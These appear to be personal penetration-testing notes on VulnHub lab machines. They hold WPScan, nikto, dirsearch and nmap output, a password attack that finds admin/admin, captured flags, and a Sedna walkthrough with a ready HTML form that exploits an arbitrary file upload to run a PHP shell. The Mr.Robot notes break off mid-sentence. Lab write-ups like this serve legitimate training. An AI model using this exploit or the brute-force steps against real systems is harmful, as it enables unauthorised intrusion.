|<br /> | [!] Title: WordPress 3.7-4.9 - &#39;newbloguser&#39; Key Weak Hashing<br /> |     Fixed in: 3.9.22<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8969<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091<br /> |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/<br /> |      - https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c<br /> |<br /> | [!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)<br /> |     Fixed in: 3.9.23<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9006<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9263<br /> |      - https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850<br /> |      - https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/<br /> |      - https://core.trac.wordpress.org/ticket/42720<br /> |<br /> | [!] Title: WordPress &lt;= 4.9.4 - Application Denial of Service (DoS) (unpatched)<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9021<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389<br /> |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html<br /> |      - https://github.com/quitten/doser.py<br /> |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html<br /> |<br /> | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default<br /> |     Fixed in: 3.9.24<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9053<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101<br /> |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/<br /> |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216<br /> |<br /> | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login<br /> |     Fixed in: 3.9.24<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9054<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100<br /> |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/<br /> |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e<br /> |<br /> | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag<br /> |     Fixed in: 3.9.24<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9055<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102<br /> |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/<br /> |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d<br /> |<br /> | [!] Title: WordPress &lt;= 4.9.6 - Authenticated Arbitrary File Deletion<br /> |     Fixed in: 3.9.25<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9100<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895<br /> |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/<br /> |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/<br /> |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd<br /> |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/<br /> |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/<br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - Authenticated File Delete<br /> |     Fixed in: 3.9.26<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9169<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147<br /> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/<br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - Authenticated Post Type Bypass<br /> |     Fixed in: 3.9.26<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9170<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152<br /> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/<br /> |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/<br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - PHP Object Injection via Meta Data<br /> |     Fixed in: 3.9.26<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9171<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148<br /> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/<br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - Authenticated Cross-Site Scripting (XSS)<br /> |     Fixed in: 3.9.26<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9172<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153<br /> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/<br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - Cross-Site Scripting (XSS) that could affect plugins<br /> |     Fixed in: 3.9.26<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9173<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150<br /> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/<br /> |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460<br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - User Activation Screen Search Engine Indexing<br /> |     Fixed in: 3.9.26<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9174<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151<br /> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/<br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - File Upload to XSS on Apache Web Servers<br /> |     Fixed in: 3.9.26<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9175<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149<br /> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/<br /> |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a<br /> |<br /> | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution<br /> |     Fixed in: 5.0.1<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9222<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943<br /> |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/<br /> |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce<br /> |<br /> | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)<br /> |     Fixed in: 3.9.27<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9230<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787<br /> |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b<br /> |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/<br /> |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/<br /> |<br /> | [!] Title: WordPress &lt;= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation<br /> |     Fixed in: 3.9.28<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/9867<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222<br /> |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/<br /> |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68<br /><br />[+] WordPress theme in use: twentyfourteen<br /> | Location: http://192.168.11.252/wordpress/wp-content/themes/twentyfourteen/<br /> | Last Updated: 2019-05-07T00:00:00.000Z<br /> | [!] The version is out of date, the latest version is 2.7<br /> | Style URL: http://192.168.11.252/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14<br /> | Style Name: Twenty Fourteen<br /> | Style URI: http://wordpress.org/themes/twentyfourteen<br /> | Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern design...<br /> | Author: the WordPress team<br /> | Author URI: http://wordpress.org/<br /> |<br /> | Detected By: Css Style (Passive Detection)<br /> |<br /> | Version: 1.1 (80% confidence)<br /> | Detected By: Style (Passive Detection)<br /> |  - http://192.168.11.252/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14, Match: &#39;Version: 1.1&#39;<br /><br />[+] Enumerating Vulnerable Plugins (via Passive Methods)<br />[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br /><br />[i] Plugin(s) Identified:<br /><br />[+] mail-masta<br /> | Location: http://192.168.11.252/wordpress/wp-content/plugins/mail-masta/<br /> | Latest Version: 1.0 (up to date)<br /> | Last Updated: 2014-09-19T07:52:00.000Z<br /> |<br /> | Detected By: Urls In Homepage (Passive Detection)<br /> |<br /> | [!] 2 vulnerabilities identified:<br /> |<br /> | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8609<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10956<br /> |      - https://www.exploit-db.com/exploits/40290/<br /> |      - https://cxsecurity.com/issue/WLB-2016080220<br /> |<br /> | [!] Title: Mail Masta 1.0 - Multiple SQL Injection<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8740<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6570<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6571<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6572<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6573<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6574<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6575<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6576<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6577<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6578<br /> |      - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin<br /> |<br /> | Version: 1.0 (100% confidence)<br /> | Detected By: Readme - Stable Tag (Aggressive Detection)<br /> |  - http://192.168.11.252/wordpress/wp-content/plugins/mail-masta/readme.txt<br /> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)<br /> |  - http://192.168.11.252/wordpress/wp-content/plugins/mail-masta/readme.txt<br /><br />[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)<br /> Checking Known Locations - Time: 00:00:00 &lt;==========================================================================================&gt; (314 / 314) 100.00% Time: 00:00:00<br />[+] Checking Theme Versions (via Passive and Aggressive Methods)<br /><br />[i] No themes Found.<br /><br />[+] Enumerating Timthumbs (via Passive and Aggressive Methods)<br /> Checking Known Locations - Time: 00:00:01 &lt;========================================================================================&gt; (2573 / 2573) 100.00% Time: 00:00:01<br /><br />[i] No Timthumbs Found.<br /><br />[+] Enumerating Config Backups (via Passive and Aggressive Methods)<br /> Checking Config Backups - Time: 00:00:00 &lt;=============================================================================================&gt; (21 / 21) 100.00% Time: 00:00:00<br /><br />[i] No Config Backups Found.<br /><br />[+] Enumerating DB Exports (via Passive and Aggressive Methods)<br /> Checking DB Exports - Time: 00:00:00 &lt;=================================================================================================&gt; (36 / 36) 100.00% Time: 00:00:00<br /><br />[i] No DB Exports Found.<br /><br />[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)<br /> Brute Forcing Attachment IDs - Time: 00:00:07 &lt;======================================================================================&gt; (100 / 100) 100.00% Time: 00:00:07<br /><br />[i] No Medias Found.<br /><br />[+] Enumerating Users (via Passive and Aggressive Methods)<br /> Brute Forcing Author IDs - Time: 00:00:01 &lt;============================================================================================&gt; (10 / 10) 100.00% Time: 00:00:01<br /><br />[i] User(s) Identified:<br /><br />[+] admin<br /> | Detected By: Author Posts - Display Name (Passive Detection)<br /> | Confirmed By:<br /> |  Rss Generator (Passive Detection)<br /> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br /> |  Login Error Messages (Aggressive Detection)<br /><br />[+] wpuser<br /> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br /> | Confirmed By: Login Error Messages (Aggressive Detection)<br /><br />[+] Performing password attack on Xmlrpc Multicall against 2 user/s<br />[SUCCESS] - admin / admin                                                                                                                                                 <br />Progress Time: 00:34:40 &lt;====                                                                                                       &gt; (1244 / 28728)  4.33%  ETA: 12:46:03<br />[i] Valid Combinations Found:<br /> | Username: admin, Password: admin<br /><br /><br />[+] Finished: Fri Oct 18 23:14:23 2019<br />[+] Requests Done: 4348<br />[+] Cached Requests: 8<br />[+] Data Sent: 1.023 MB<br />[+] Data Received: 128.31 MB<br />[+] Memory used: 879.973 MB<br />[+] Elapsed time: 00:34:59<br /><br />Scan Aborted: invalid byte sequence in UTF-8<br />Trace: /usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:51:in `gsub!&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:51:in `text&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:21:in `tag&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:197:in `conv2value&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:235:in `block in conv2value&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:235:in `collect&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:235:in `conv2value&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:227:in `block in conv2value&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:224:in `each&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:224:in `collect&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:224:in `conv2value&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:235:in `block in conv2value&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:235:in `collect&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:235:in `conv2value&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:119:in `block in methodCall&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:118:in `collect&#39;<br />/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:118:in `methodCall&#39;<br />/usr/share/rubygems-integration/all/gems/cms_scanner-0.5.4/app/models/xml_rpc.rb:64:in `multi_call&#39;<br />/usr/share/rubygems-integration/all/gems/wpscan-3.6.0/app/finders/passwords/xml_rpc_multicall.rb:22:in `do_multi_call&#39;<br />/usr/share/rubygems-integration/all/gems/wpscan-3.6.0/app/finders/passwords/xml_rpc_multicall.rb:51:in `block in attack&#39;<br />/usr/share/rubygems-integration/all/gems/wpscan-3.6.0/app/finders/passwords/xml_rpc_multicall.rb:44:in `loop&#39;<br />/usr/share/rubygems-integration/all/gems/wpscan-3.6.0/app/finders/passwords/xml_rpc_multicall.rb:44:in `attack&#39;<br />/usr/share/rubygems-integration/all/gems/wpscan-3.6.0/app/controllers/password_attack.rb:42:in `run&#39;<br />/usr/share/rubygems-integration/all/gems/cms_scanner-0.5.4/lib/cms_scanner/controllers.rb:48:in `each&#39;<br />/usr/share/rubygems-integration/all/gems/cms_scanner-0.5.4/lib/cms_scanner/controllers.rb:48:in `block in run&#39;<br />/usr/lib/ruby/2.5.0/timeout.rb:76:in `timeout&#39;<br />/usr/share/rubygems-integration/all/gems/cms_scanner-0.5.4/lib/cms_scanner/controllers.rb:43:in `run&#39;<br />/usr/share/rubygems-integration/all/gems/cms_scanner-0.5.4/lib/cms_scanner/scan.rb:24:in `run&#39;<br />/usr/share/rubygems-integration/all/gems/wpscan-3.6.0/bin/wpscan:16:in `block in &lt;top (required)&gt;&#39;<br />/usr/share/rubygems-integration/all/gems/cms_scanner-0.5.4/lib/cms_scanner/scan.rb:15:in `initialize&#39;<br />/usr/share/rubygems-integration/all/gems/wpscan-3.6.0/bin/wpscan:6:in `new&#39;<br />/usr/share/rubygems-integration/all/gems/wpscan-3.6.0/bin/wpscan:6:in `&lt;top (required)&gt;&#39;<br />/usr/bin/wpscan:23:in `load&#39;<br />/usr/bin/wpscan:23:in `&lt;main&gt;&#39;<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>www-data    2bafe61f03117ac66a73c3c514de796e<br /><br />root                8e3f9ec016e3598c5eec11fd3d73f6fb<br /></div><div class='page'><h1 class='title level-4'>Sedna</h1><br/>nmap scan showed that 22, 53, 80, 110, 111, 139, 143, 445, 993, 995, 8080, 51024<br />going in order<br />    22, version not vulnerable<br />    53, dns showed no signs of zone transfer<br />    80 dirsearch showed a themes directory,<br />    after a short time I was able to deduce that the theme was created by “BuilderEngine”<br />    Searchsploit showed that there was a arbitrary file upload exploit!!<br />    <br />Copy example code from below and paste to new file yeet.html<br /><br />&lt;html&gt;<br />&lt;body&gt;<br />&lt;form method=&quot;post&quot; action=&quot;http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />        &lt;input type=&quot;file&quot; name=&quot;files[]&quot; /&gt;<br />        &lt;input type=&quot;submit&quot; value=&quot;send&quot; /&gt;<br />&lt;/form&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /><br />Edit localhost to represent target Ip<br />In firefox browser<br />    file:///root/Desktop/Machines/VulnHub/HF2019/Sedna/yeet.html<br />  <br />This will bring up a page that will allow you to upload a file (optimally a php shellcode)<br />    browse&gt; to cannon.php &gt; send<br />    <br />In this exploit (40390) you go to 192.168.11.250/files/ and click on cannon.php to execute your shellcode. This will differ by exploit<br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nikto</h1><br/><br /></div><div class='page'><h1 class='title level-7'>80</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.250<br />+ Target Hostname:    192.168.11.250<br />+ Target Port:        80<br />+ Start Time:         2019-10-20 19:09:41 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.7 (Ubuntu)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ &quot;robots.txt&quot; contains 1 entry which should be manually viewed.<br />+ Server may leak inodes via ETags, header found with file /, inode: 65, size: 53fb059bb5bc8, mtime: gzip<br />+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS <br />+ OSVDB-3268: /files/: Directory indexing found.<br />+ OSVDB-3092: /files/: This might be interesting...<br />+ OSVDB-3092: /system/: This might be interesting...<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ OSVDB-3092: /license.txt: License file found may identify site software.<br />+ 7916 requests: 0 error(s) and 12 item(s) reported on remote host<br />+ End Time:           2019-10-20 19:10:45 (GMT-4) (64 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/VulnHub/HF2019/Sedna# <br /></div><div class='page'><h1 class='title level-7'>8080</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.250<br />+ Target Hostname:    192.168.11.250<br />+ Target Port:        8080<br />+ Start Time:         2019-10-20 19:09:41 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache-Coyote/1.1<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS <br />+ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.<br />+ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.<br />+ /: Appears to be a default Apache Tomcat install.<br />+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.<br />+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.<br />+ /manager/html: Default Tomcat Manager / Host Manager interface found<br />+ /host-manager/html: Default Tomcat Manager / Host Manager interface found<br />+ /manager/status: Default Tomcat Server Status interface found<br />+ 8221 requests: 0 error(s) and 12 item(s) reported on remote host<br />+ End Time:           2019-10-20 19:10:10 (GMT-4) (29 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/VulnHub/HF2019/Sedna# <br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/><br /></div><div class='page'><h1 class='title level-7'>80</h1><br/> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-20_19-09-42.log<br /><br />Target: http://192.168.11.250:80<br /><br />[19:09:42] Starting: <br />[19:09:42] 403 -  285B  - /.php     <br />[19:09:42] 403 -  287B  - /icons/      <br />[19:09:42] 200 -    2KB - /files/      <br />[19:09:42] 200 -    2KB - /themes/    <br />[19:09:43] 200 -    2KB - /modules/   <br />[19:09:45] 200 -  142B  - /system/              <br />[19:09:48] 200 -   11KB - /blocks/           <br />[19:15:57] 403 -  295B  - /server-status/                                    <br />                                                                <br />Task Completed<br />root@kali:~/Desktop/Machines/VulnHub/HF2019/Sedna# <br /></div><div class='page'><h1 class='title level-7'>8080</h1><br/> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-20_19-09-42.log<br /><br />Target: http://192.168.11.250:8080<br /><br />[19:09:42] Starting: <br />[19:09:42] 200 -   18KB - /docs/       <br />[19:09:45] 200 -    1KB - /examples/            <br />[19:10:01] 302 -    0B  - /manager/  -&gt;  http://192.168.11.250:8080/manager/html;jsessionid=F719F592B5F1B3D85A88A976195FDC99?org.apache.catalina.filters.CSRF_NONCE=D34347AD09E8D215AA6B6AE895E5AEE4<br />[19:11:16] 400 -    0B  - /http%3A%2F%2Fwww.php           <br />[19:11:16] 400 -    0B  - /http%3A%2F%2Fwww/<br />[19:13:29] 400 -    0B  - /http%3A%2F%2Fyoutube.php                            <br />[19:13:29] 400 -    0B  - /http%3A%2F%2Fyoutube/<br />[19:14:21] 400 -    0B  - /http%3A%2F%2Fblogs.php                          <br />[19:14:21] 400 -    0B  - /http%3A%2F%2Fblogs/<br />[19:14:30] 400 -    0B  - /http%3A%2F%2Fblog.php         <br />[19:14:30] 400 -    0B  - /http%3A%2F%2Fblog/<br />[19:15:15] 400 -    0B  - /%2A%2Ahttp%3A%2F%2Fwww.php                     <br />[19:15:15] 400 -    0B  - /%2A%2Ahttp%3A%2F%2Fwww/<br />[19:20:07] 400 -    0B  - /External%5CX-News.php                 <br />[19:20:07] 400 -    0B  - /External%5CX-News/<br />[19:22:08] 400 -    0B  - /http%3A%2F%2Fcommunity.php         <br />[19:22:08] 400 -    0B  - /http%3A%2F%2Fcommunity/<br />[19:22:45] 400 -    0B  - /http%3A%2F%2Fradar.php                            <br />[19:22:45] 400 -    0B  - /http%3A%2F%2Fradar/<br />[19:24:01] 400 -    0B  - /http%3A%2F%2Fjeremiahgrossman.php    <br />[19:24:01] 400 -    0B  - /http%3A%2F%2Fjeremiahgrossman/<br />[19:24:01] 400 -    0B  - /http%3A%2F%2Fweblog.php   <br />[19:24:01] 400 -    0B  - /http%3A%2F%2Fweblog/<br />[19:24:03] 400 -    0B  - /http%3A%2F%2Fswik.php<br />[19:24:03] 400 -    0B  - /http%3A%2F%2Fswik/<br />                                                        <br />Task Completed<br />root@kali:~/Desktop/Machines/VulnHub/HF2019/Sedna#</div><div class='page'><h1 class='title level-6'>nmap</h1><br/><br />root@kali:~/Desktop/Machines/VulnHub/HF2019/Sedna# nmap -sC -sV -p- 192.168.11.250<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-20 19:05 EDT<br />Nmap scan report for 192.168.11.250<br />Host is up (0.0024s latency).<br />Not shown: 65523 closed ports<br />PORT      STATE SERVICE     VERSION<br />22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)<br />|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)<br />|   256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)<br />|_  256 ca:36:3c:32:e6:24:f9:b7:b4:d4:1d:fc:c0:da:10:96 (ED25519)<br />53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)<br />| dns-nsid: <br />|_  bind.version: 9.9.5-3-Ubuntu<br />80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))<br />| http-robots.txt: 1 disallowed entry <br />|_Hackers<br />|_http-server-header: Apache/2.4.7 (Ubuntu)<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />110/tcp   open  pop3        Dovecot pop3d<br />111/tcp   open  rpcbind     2-4 (RPC #100000)<br />| rpcinfo: <br />|   program version   port/proto  service<br />|   100000  2,3,4        111/tcp  rpcbind<br />|   100000  2,3,4        111/udp  rpcbind<br />|   100024  1          38019/udp  status<br />|_  100024  1          51024/tcp  status<br />139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />143/tcp   open  imap        Dovecot imapd (Ubuntu)<br />445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)<br />993/tcp   open  ssl/imaps?<br />995/tcp   open  ssl/pop3s?<br />8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1<br />| http-methods: <br />|_  Potentially risky methods: PUT DELETE<br />|_http-open-proxy: Proxy might be redirecting requests<br />|_http-server-header: Apache-Coyote/1.1<br />|_http-title: Apache Tomcat<br />51024/tcp open  status      1 (RPC #100024)<br />MAC Address: 00:0C:29:B4:E1:ED (VMware)<br />Service Info: Host: SEDNA; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_clock-skew: mean: 5h14m39s, deviation: 2h18m34s, median: 3h54m39s<br />|_nbstat: NetBIOS name: SEDNA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br />| smb-os-discovery: <br />|   OS: Unix (Samba 4.1.6-Ubuntu)<br />|   Computer name: sedna<br />|   NetBIOS computer name: SEDNA\x00<br />|   Domain name: localdomain<br />|   FQDN: sedna.localdomain<br />|_  System time: 2019-10-20T23:00:34-04:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2019-10-20 23:00:35<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 156.04 seconds</div><div class='page'><h1 class='title level-5'>flag</h1><br/>www-data        bfbb7e6e6e88d9ae66848b9aeac6b289<br /><br />root                   a10828bee17db751de4b936614558305</div><div class='page'><h1 class='title level-3'>Mr.Robot</h1><br/>nmap showed that the machine was running 22 (closed), 80, and 443<br />dirsearch showed me that robots.txt was open, and that was the first key!<br />There was also a dic file named fsociety. I downloaded it and it looks to be a word file. This will be important later.<br />dirsearch also showed me the wp-login page.<br />I tried admin, root, wpadmin and a few other usernames (withkeyboard slams for passwords). no positive responces like WP often does when there is a good username.<br />In blogs I saw that the only person to post was ‘elliot’<br />tried elliot and keyboard slam... BOOM! ‘The password you entered for the username elliot is 